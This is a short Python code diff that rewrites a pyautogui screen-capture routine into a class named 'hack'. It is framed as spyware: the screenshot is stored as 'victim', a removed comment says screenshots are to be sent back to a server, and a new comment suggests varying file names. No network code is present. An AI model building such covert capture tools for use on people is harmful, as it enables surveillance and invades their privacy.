@@ -1,10 +1,22 @@
-import os
-from os import path
 import pyautogui
 
 
-def screenshot(filenamesave):
-    victim = pyautogui.screenshot()
-    filenameformat = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop\\')
-    victim.save(filenameformat + filenamesave) 
-    # Please use this function to send screenshots back to server.
+
+
+
+
+
+class hack:
+    def __init__(self,screenshotname):
+        self.screenshotname = screenshotname
+
+        self.screenshotname = pyautogui.screenshot()
+        self.screenshotname.save(screenshotname)
+
+
+    def func(self):
+        s = self.screenshotname
+        return s
+
+p1 = hack("John.jpg")#Call this from another module so the name will be varied.)
+p1.func()
